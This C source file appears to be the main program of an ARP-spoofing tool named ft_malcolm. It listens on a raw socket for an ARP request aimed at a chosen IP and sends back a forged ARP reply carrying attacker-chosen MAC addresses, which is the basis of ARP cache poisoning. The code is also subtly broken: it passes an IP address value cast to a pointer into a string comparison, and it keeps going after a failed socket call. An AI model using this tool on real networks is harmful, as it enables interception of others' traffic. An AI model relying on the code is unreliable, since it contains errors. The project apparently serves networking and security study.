#include "ft_malcolm.h"

int g_stop = 0;

void	handler(int sig)
{
	printf("\nSignal reçu\n");
	g_stop = 1;
	(void) sig;
}

int	main(int argc, char **argv)
{
	unsigned char buffer[1518];
	struct sockaddr_ll addr;
	socklen_t addr_len = sizeof(addr);
	struct in_addr target_ip, source_ip;
	unsigned char target_mac[6];
	unsigned char source_mac[6];

	signal(SIGINT, handler);

	struct timeval tv;
	tv.tv_sec = 1;
	tv.tv_usec = 0;

	if (check_args(argc, argv, source_mac, target_mac, &target_ip, &source_ip) == 1)
	return (1);
	int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (sock < 0)
	fprintf(stderr, "socket : %s\n", strerror(errno));
	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
	while (!g_stop)
	{
		int b = recvfrom(sock, buffer, 1518, 0, (struct sockaddr *)&addr, &addr_len);
		if (b > 0)
		{
			if (buffer[12] == 8 && buffer[13] == 6)
			{
				if (ft_strncmp(&buffer[28], (unsigned char *)target_ip.s_addr, 4) == 0)
				{
					receive_arp(addr, buffer);
					fill_arp_reply(buffer, target_mac, source_mac, target_ip, source_ip);
					sleep(3);
					sendto(sock, buffer, 42, 0, (struct sockaddr *)&addr, addr_len);
					close(sock);
					return 0;
				}
			}
		}
	}
	close(sock);
}